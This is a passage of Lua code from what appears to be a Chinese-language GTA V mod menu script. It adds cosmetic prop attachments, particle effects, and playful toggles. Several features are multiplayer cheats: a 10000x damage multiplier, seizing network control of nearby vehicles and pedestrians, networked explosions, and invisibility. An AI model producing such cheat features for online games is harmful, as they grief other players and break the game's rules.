               util.toast("夜幕音频没有正确安装！.")
              util.stop_script()
             end
            fp = io.open(sound_selection_dir, 'r')
             local file_selection = fp:read('*a')
             fp:close()
                 local sound_location = store_dir .. '\\' .. file_selection
              if not filesystem.exists(sound_location) then
                    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
              else
               --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
              end
           util.keep_running()
      notification("原批，请耐心等待...",colors.black)
      util.yield(3500)
       require "lib.YeMulib.YuanShen"
       menu.delete(YUANSHENaction)
    else
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound12.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
      notification("原批，请耐心等待...",colors.black)
      util.yield(3500)
       require "lib.YeMulib.YuanShen"
       menu.delete(YUANSHENaction)
      end
    end)
pendants = menu.list(misc, '夜幕GIF', {'GIF'}, '原神，启动！！！')
    kelilogo = menu.list(pendants, '可莉(一)', {}, '')
        menu.toggle(kelilogo, "开启", {}, "", function(on)
            GIF_keli(on)
        end)
        menu.slider(kelilogo, "x坐标", {"logocoord1-x"}, "", -100, 100, 86, 1, function(x_)
            logocoord1.x = x_ / 100
        end)
        menu.slider(kelilogo, "y坐标", {"logocoord1-y"}, "", -100, 100, 57, 1, function(y_)
            logocoord1.y = y_ / 100
        end)
        menu.slider(kelilogo, "图标过渡帧率", {}, "", 1, 60, 20, 1, function(value)
            logocoord1.fps = 1000 / value
        end)
    kelilogo2 = menu.list(pendants, '可莉(二)', {}, '')
        menu.toggle(kelilogo2, "开启", {}, "", function(on)
            GIF_keli2(on)
        end)
        menu.slider(kelilogo2, "x坐标", {"logocoord1-x"}, "", -100, 100, 86, 1, function(x_)
            logocoord1.x = x_ / 100
        end)
        menu.slider(kelilogo2, "y坐标", {"logocoord1-y"}, "", -100, 100, 57, 1, function(y_)
            logocoord1.y = y_ / 100
        end)
        menu.slider(kelilogo2, "图标过渡帧率", {}, "", 1, 60, 20, 1, function(value)
            logocoord1.fps = 1000 / value
        end)
wallpaper = menu.list(misc, '夜幕界面壁纸', {''}, '')
require "lib.YeMulib.YMwallpaper"
YMpaws = menu.list(misc,"在地图上养一只小狗？", {},"")
YMpaws1 = menu.action(YMpaws, "加载小狗", {""}, "", function()
        notification("正在加载小狗,请稍等...",colors.black)
        util.yield(1500)
        require "lib.YeMulib.YMpaws"
        menu.delete(YMpaws1)
end)
module_list = menu.list(sc, "第一模组选项")
    require "lib.YeMulib.Constructor"
script_meta_menu = menu.list(YM_root, "夜幕脚本支持", {}, "")
    acknowledgement()
    --end)
menu.divider(YM_root, "版本号:" .. Version ..  "更新于" .. date ..  "", {}, "")
menu.toggle_loop(exterior, "发光", {}, "", function()
   FG()
end)
menu.toggle(exterior, "掏出诺基亚", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_mobile_film_shocking@female@base") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_mobile_film_shocking@female@base")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_v_m_phone_01"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_mobile_film_shocking@female@base", "base", 10, 3, -1, 51, 5, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), 0.52,0.43,-0.16,0.2,70,340, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end)
menu.toggle(exterior, "高尔夫背包1",{""}, "",function(on)
    local six = "prop_golf_bag_01b"
    if on then     
        attach_to_player(six, 0, 0, -0.3, 0.3, 0, 0,0)
    else
        delete_object(six)
    end
end)
menu.toggle(exterior, "高尔夫背包2",{""}, "",function(on)
    local six = "prop_golf_bag_01c"
    if on then     
        attach_to_player(six, 0, 0, -0.3, 0.3, 0, 0,0)
    else
        delete_object(six)
    end
end)
toubushuzi = menu.list(exterior, "头部显示", {}, "", function(); end)
menu.toggle(toubushuzi, "250",{""}, "",function(on)
    local six = "prop_mp_num_2"
    local sixs = "prop_mp_num_5"
    local sixss = "prop_mp_num_0"
    if on then     
        attach_to_player(six, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixss, 0, 1.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixs, 0, -1.0, 0, 1.7, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixs)
    end
end)
menu.toggle(toubushuzi, "520",{""}, "",function(on)
    local six = "prop_mp_num_5"
    local sixs = "prop_mp_num_2"
    local sixss = "prop_mp_num_0"
    if on then     
        attach_to_player(sixs, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixss, 0, 1.0, 0, 1.7, 0, 0,0)
        attach_to_player(six, 0, -1.0, 0, 1.7, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixs)
    end
end)
menu.toggle(toubushuzi, "666大法",{""}, "",function(on)
    local six = "prop_mp_num_6"
    local sixs = "prop_mp_num_6"
    local sixss = "prop_mp_num_6"
    local sixsss = "prop_mp_num_6"
    local sixssss = "prop_mp_num_6"
    if on then     
        attach_to_player(sixs, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixss, 0, 1.0, 0, 1.0, 0, 0,0)
        attach_to_player(sixsss, 0, 1.0, 0, 0, 0, 0,0)
        attach_to_player(sixssss, 0, -1.0, 0, 0, 0, 0,0)
        attach_to_player(six, 0, -1.0, 0, 1.0, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixsss)
        delete_object(sixssss)
        delete_object(sixs)
    end
end)
menu.toggle(toubushuzi, "球",{""}, "",function(on)
    local six = "v_ilev_exball_blue"
    if on then     
        attach_to_player(six, 0, 0, 0, 0.8, 0, 0,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "炸弹",{""}, "",function(on)
    local six = "imp_prop_bomb_ball"
    if on then     
        attach_to_player(six, 0, 0, 0, 0.8, 0, 0,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "七叶草",{""}, "",function(on)
    local six = "prop_ex_weed_wh"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "光头遗照",{""}, "",function(on)
    local sixs = "prop_employee_month_01"
    if on then     
        attach_to_player(sixs, 2, 0.0, 0, 1.7, 0, 0,180)
    else
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "小富遗照",{""}, "",function(on)
    local sixs = "prop_employee_month_02"
    if on then     
        attach_to_player(sixs, 2, 0.0, 0, 1.7, 0, 0,180)
    else
        delete_object(sixs)
    end
end)
menu.toggle(toubushuzi, "中国国旗",{""}, "",function(on)
    local six = "apa_prop_flag_china"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗1",{""}, "",function(on)
    local six = "prop_flag_sheriff_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗2",{""}, "",function(on)
    local six = "prop_flag_canada_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗3",{""}, "",function(on)
    local six = "prop_flag_eu_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗4",{""}, "",function(on)
    local six = "prop_flag_german_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗5",{""}, "",function(on)
    local six = "prop_flag_ireland_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗6",{""}, "",function(on)
    local six = "prop_flag_japan_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗7",{""}, "",function(on)
    local six = "prop_flag_ls_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗8",{""}, "",function(on)
    local six = "prop_flag_mexico_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗9",{""}, "",function(on)
    local six = "prop_flag_lsfd_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
menu.toggle(toubushuzi, "国旗10",{""}, "",function(on)
    local six = "prop_flag_us_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)
suijijianqi = function(x)
    local r = math.random(1,5)
    return x[r]
end
wushidao = menu.list(exterior, "装逼功能", {}, "", function(); end)
jianqi = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
menu.toggle(wushidao, "键盘侠之王", {""}, "", function(state)--出自Heezy二代目
    wanjianguizong_3 = state
    local katana = "prop_cs_keyboard_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_3 do
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            util.yield(200)
    end
    else
        delete_object(katana)
    end
end)
jianqi = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
menu.toggle(wushidao, "剑圣", {""}, "", function(state)--出自Heezy二代目
    wanjianguizong_3 = state
    local katana = "prop_cs_katana_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_3 do
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            util.yield(200)
    end
    else
        delete_object(katana)
    end
end)
menu.toggle(wushidao, "冲浪板V1",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_03"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)
menu.toggle(wushidao, "冲浪板V2",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_04"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)
menu.toggle(wushidao, "冲浪板V3",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_02"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)
menu.toggle(wushidao, "冲浪板V4",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_01"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)
menu.toggle(exterior, "吉他手",{""}, "",function(on)--hezzy
    local guitar = "prop_acc_guitar_01"
    if on then     
        attach_to_player(guitar, 0, 0, -0.15, 0.25, 0, -50,0)
    else
        delete_object(guitar)
    end
end)
menu.toggle(exterior, "泳圈",{""}, "",function(on)--hezzy
    local swimming_circle = "prop_beach_ring_01"
    if on then     
        attach_to_player(swimming_circle, 0, 0, 0, 0, 0, 0,0)
    else
        delete_object(swimming_circle)
    end
end)
menu.toggle(exterior, '显示脚印', {'JSfootSteps'}, '在所有表面上留下脚印.', function(toggle)
    GRAPHICS._SET_FORCE_PED_FOOTSTEPS_TRACKS(toggle)
end)
menu.toggle_loop(funfeatures, "外星人入侵", {}, "", function(toggle)
    ufffo()
end)
dachui = menu.list(funfeatures, "装逼武器")
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
firebones  = {
        26612,	
        58868,	
}
firebones1  = {
        26612,	
        58868,	
} 
local bigbarrelqq = false
menu.toggle(dachui, "闪电大锤", {"bighammer"}, "", function(on)
            if on then
            for _, boneId in ipairs(firebones) do
            request_ptfx_asset("scr_reconstructionaccident")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)            end
            for _, boneId in ipairs(firebones1) do
            request_ptfx_asset("scr_reconstructionaccident")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)            end
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 10000")
                menu.trigger_commands("rangemultiplier 9.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
end,false)
firebones  = {
        26612,	
        58868,	
}
local bigbarrelqqV2 = false
    menu.toggle(dachui, "细狗的威力", {"ciliudog"}, "不要小瞧细狗的威力", function(on)
        notification("细狗---闪亮登场~",colors.black)
        MISC.FORCE_LIGHTNING_FLASH()
        if on then
            for _, boneId in ipairs(firebones) do
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
            end
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
            dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_tool_screwvr03"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
            menu.trigger_commands("damagemultiplier 1000")
            menu.trigger_commands("rangemultiplier 1.5")
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
            util.yield(1000)
            bigbarrelqqV2 = on
        else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        entities.delete_by_handle(dachui)
        bigbarrelqqV2 = off
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
    end
end,false)
menu.toggle(dachui, "单走一个6锤", {""}, "", function(on)
     dachui6(on)
end)
        menu.toggle(dachui, "超级大铲子", {""}, "", function(on)
            dachui3(on)
        end)
        menu.toggle(dachui, "超级大菜刀", {""}, "", function(on)
            dachui5(on)
        end)
bianshenxuanx = menu.list(funfeatures, "变身选项", {}, "", function(); end)
menu.toggle(bianshenxuanx, "变成大球", {""}, "", function(on)
    dachui16(on)
end)
menu.toggle(bianshenxuanx, "变成足球", {""}, "", function(on)
    dachui17(on)
end)
menu.toggle(bianshenxuanx, "变成黄球", {""}, "", function(on)
    dachui18(on)
end)
heidong = menu.list(funfeatures,"黑洞选项", {},"加载之后玩家栏有副菜单！")
heidongxuanxiang = menu.action(heidong, "加载黑洞选项", {""}, "", function()
        notification("正在加载黑洞选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.YeMulib.YMh"
        menu.delete(heidongxuanxiang)
    end)
menu.toggle(funfeatures, "洛圣都暴乱", {}, "因为npc受不了巨大的压力而引发暴乱！", function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)
menu.toggle_loop(funfeatures, "载具暴乱", {}, "使附近的汽车进入哥布林-妖精模式",function()
    for i, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 10.0, 0.0, true, true, true, true)
    end
end)
menu.toggle(funfeatures, "举起手来(按x)",{""}, "遇到警察该怎么做~",function(state)
    handsup = state
    while handsup do
        juqishoulai()
        util.yield()
    end
end)
menu.toggle_loop(funfeatures, "定点轰炸", {"pointbombing"}, "标点指定轰炸", function ()--=====heezy
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)
        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield_once()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end)
local dalishi = menu.list(funfeatures, "大力士选项", {}, "")
menu.toggle_loop(dalishi,"抛掷载具", {"throwcars"}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
        throwvehs()
end)
menu.toggle_loop(dalishi,"抛掷NPC", {"throwpeds"}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
    throwpeds()
end)
menu.toggle(funfeatures, "动物模式", {"spawnfurry"}, "动物狂欢节", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            notification("动物模式启动") 
        else
            restore_model()
        end
end)
menu.toggle_loop(funfeatures, "繁星点缀", {}, "烟花像繁星一样", function()
    coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        coords['x'] = coords['x'] + math.random(-100, 100)
        coords['y'] = coords['y'] + math.random(-100, 100)
        coords['z'] = coords['z'] + math.random(30, 100)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 38, 100.0, true, false, 0.0)
    util.yield(100)
end)
menu.toggle(funfeatures, "夜幕的选择题",{""}, "八嘎，都来做！！！",function(state)
    zcndxz(state)
end)
menu.toggle_loop(funfeatures, "雷电将军", {"leidian"}, "形成包围圈", function(on)
       YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'ls.png')
        if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.9
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 0.5 then
                logo_alpha_incr = -0.9
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound14.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
    MISC.FORCE_LIGHTNING_FLASH()
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
    baozhanquan()
end)
menu.toggle(funfeatures, "灵魂游荡", {""}, "", function(toggle)
        ghost = toggle 
        if ghost then
        all_peds = entities.get_all_peds_as_handles()
        user_ped = players.user_ped()
        clone = PED.CLONE_PED(user_ped,true, true, true)
        pos = ENTITY.GET_ENTITY_COORDS(clone, false)
		ENTITY.SET_ENTITY_COORDS(user_ped, pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), 90, false)
        ENTITY.SET_ENTITY_INVINCIBLE(clone,true)
        menu.trigger_commands("invisibility remote")
        util.create_tick_handler(function()
        STREAMING.REQUEST_ANIM_DICT("move_crawl")
        PED.SET_PED_MOVEMENT_CLIPSET(clone, "move_crawl", -1)
        mod_uses("ped", if on then 12 else -12)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        return ghost
        end)
        else
            clonepedpos = ENTITY.GET_ENTITY_COORDS(clone, false)
            ENTITY.SET_ENTITY_COORDS(user_ped, clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
            entities.delete_by_handle(clone)
            ENTITY.SET_ENTITY_ALPHA(user_ped, 255, false)
            menu.trigger_commands("invisibility off")
        end
end)
menu.toggle(funfeatures, "飞天扫帚", {""}, "", function(on)
    flying_broom(on)
end)
menu.action(funfeatures,"50张多米诺骨牌", {}, "", function()
    local hash = util.joaat("prop_boogieboard_01")
    request_model_load(hash)
    local last_ent = players.user_ped()
    for i=2, 50 do 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, -i, 0)
        local d = entities.create_object(hash, c)
        ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
    end
end)
menu.list_select(funfeatures,  "改变地球引力", {},"改变GTA世界的引力", World_gravity_option, 1,function(option_index)
    World_gravity(option_index)
end)
menu.toggle_loop(funfeatures, "暴躁的汽车司机", {}, "来自于司机的暴躁", function() 
    AUDIO.SET_AGGRESSIVE_HORNS(true)
    for i, vehs in pairs(entities.get_all_vehicles_as_handles()) do
        VEHICLE.START_VEHICLE_HORN(vehs, 1000, 0, false)
    end
    util.yield(1000)
end)
menu.click_slider(funfeatures, "缩小NPC", {""}, "1 = 缩小, 2 = 恢复", 1, 2, 1, 1, function(NPCON)
    if NPCON == 1 then	
        wait(0)
        local peds = entities.get_all_peds_as_handles()
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
                PED.SET_PED_CONFIG_FLAG(peds[i], 223, true)
            end
        end
    end
    if NPCON == 2 then
    wait(0)
        local peds = entities.get_all_peds_as_handles()
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
                PED.SET_PED_CONFIG_FLAG(peds[i], 223, false)
            end
        end
    end
end)
---------------------------------夜幕独创功能，CV请鸣谢夜幕，否则全家必暴毙-------------------
menu.toggle(funfeatures, "坐如磐石", {""}, "", function(on)
    sitrock(on)
    if on then 
    local c2 = {}
    c2.x = 206
    c2.y = -80
    c2.z = 560
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c2.x, c2.y, c2.z+5)
    menu.trigger_commands("luntaixiaoguo on")
    while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do 
        STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
        util.yield()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
